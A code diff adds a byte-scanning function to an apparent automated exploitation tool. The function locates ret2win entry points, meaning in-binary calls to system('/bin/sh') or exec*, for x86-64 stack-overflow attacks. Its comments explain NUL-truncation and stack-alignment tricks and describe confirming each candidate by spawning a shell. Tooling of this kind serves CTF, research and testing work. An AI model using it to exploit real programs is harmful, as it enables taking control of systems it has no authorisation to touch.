@@ -294,6 +294,91 @@ def resolve_plt(exe_path, name: str):
     return int(m.group(1), 16) if m else None
 
 
+# --- single-address ret2win: a direct in-image call to a shell-spawning libc function -----------
+# The win a stripped/no-PIE target hides and the recovered call graph routinely MISSES: a short run
+# of code that sets up the argument and `call`s system("/bin/sh") / execl(...) directly (a backdoor,
+# a debug hook, a dead `never()`). Found by scanning the executable BYTES for a direct `call`/`jmp
+# rel32` whose target is the shell PLT stub -- NOT the (often-incomplete) recovered edges; on the
+# target that motivated this, the disassembler folded the whole function into an adjacent one and
+# recorded no `system` edge at all, so find_win's call-graph route saw nothing.
+#
+# Why a ret2win and not a ROP chain: this is the ONLY x86-64 shell primitive a NUL-TRUNCATING string
+# sink (strcpy/strcat/sprintf) can deliver. The overwrite is ONE address; on a no-PIE image its high
+# bytes are zero, so the copy's terminating NUL and the already-zero saved-return high bytes rebuild
+# the exact address -- whereas a multi-word ROP chain's first embedded NUL (every 0x40xxxx gadget has
+# one) cuts the copy and nothing past it lands. We offer both the function entry and the argument-
+# setup instruction as candidate entries: they bracket the two stack alignments libc's `do_system`
+# movaps needs (entering past a `push rbp` shifts rsp by 8). The caller confirms each by a SPAWNED
+# SHELL plus a neutralised-slot negative control, so a wrong entry (bad alignment, arg not set, or a
+# byte that was never an instruction boundary) spawns nothing and is simply discarded -- never filed.
+_SHELL_PLT_NAMES = ("system", "execl", "execlp", "execv", "execve", "execvp", "execle")
+#: Openers of an instruction that sets up the first argument (rdi / its feeder rax). Entering at one
+#: of these skips the prologue's `push rbp`, giving the alternate stack alignment.
+_RDI_SETUP_OPENERS = (
+    b"\x48\x8d\x3d",       # lea rdi, [rip+disp32]   -- &"/bin/sh" straight into rdi
+    b"\x48\x8d\x05",       # lea rax, [rip+disp32]   -- &"/bin/sh" into rax (then mov rdi, rax)
+    b"\x48\xc7\xc7",       # mov rdi, imm32 (sign-extended)
+    b"\xbf",               # mov edi, imm32          -- the no-PIE &"/bin/sh" idiom
+)
+#: Function-prologue openers -- the entry WITH `push rbp`, the other alignment.
+_PROLOGUE_OPENERS = (
+    b"\xf3\x0f\x1e\xfa",   # endbr64
+    b"\x55\x48\x89\xe5",   # push rbp ; mov rbp, rsp
+)
+
+
+def find_shell_call_wins(data: bytes, exe_path, *, max_candidates: int = 16) -> list:
+    """Candidate ret2win ENTRY addresses (ints, best-first) that reach system/exec*("/bin/sh") with
+    the argument already set up in the image. Pure stdlib byte scan; see the comment above. Empty
+    when the image makes no direct call to a shell-spawning PLT stub. The caller MUST confirm each
+    candidate by a real spawned shell -- these are leads, not a verdict."""
+    segs = _loads(data)
+    if not segs:
+        return []
+    plts = {}
+    for n in _SHELL_PLT_NAMES:
+        a = resolve_plt(exe_path, n)
+        if a is not None:
+            plts[a] = n
+    if not plts:
+        return []
+    cands: list = []                                       # (score, va) -- lower score tried first
+    seen: set = set()
+
+    def _emit(va, score):
+        if va is not None and va not in seen:
+            seen.add(va)
+            cands.append((score, va))
+
+    for off, sz, va_base, flags in segs:
+        if not (flags & 1):                                # executable segments only
+            continue
+        end = off + sz
+        p = off
+        while p + 5 <= end:
+            if data[p] in (0xE8, 0xE9):                     # call rel32 / jmp rel32
+                rel = struct.unpack_from("<i", data, p + 1)[0]
+                site_va = va_base + (p - off)
+                if (site_va + 5 + rel) in plts:
+                    # argument-setup entries: nearest opener in the 40 bytes before the call
+                    # (closer to the call = more likely the real setup -> a lower, earlier score).
+                    for opener in _RDI_SETUP_OPENERS:
+                        q = data.rfind(opener, max(off, p - 40), p)
+                        if q >= 0:
+                            _emit(va_base + (q - off), 10 + (p - q))
+                    # function-entry alignments: nearest prologue in the 64 bytes before the call
+                    for opener in _PROLOGUE_OPENERS:
+                        q = data.rfind(opener, max(off, p - 64), p)
+                        if q >= 0:
+                            base = va_base + (q - off)
+                            _emit(base, 100 + (p - q))
+                            if opener == b"\xf3\x0f\x1e\xfa":   # also: just past the endbr64
+                                _emit(base + 4, 80 + (p - q))
+            p += 1
+    cands.sort(key=lambda sv: sv[0])
+    return [va for _s, va in cands[:max_candidates]]
+
+
 #: How much room the chain leaves BELOW itself and the alignment it lands on -- both measured, and
 #: the reason is worth keeping: the pivoted stack is not a place to read words from, it IS the
 #: stack, and every function the chain calls grows down into it.
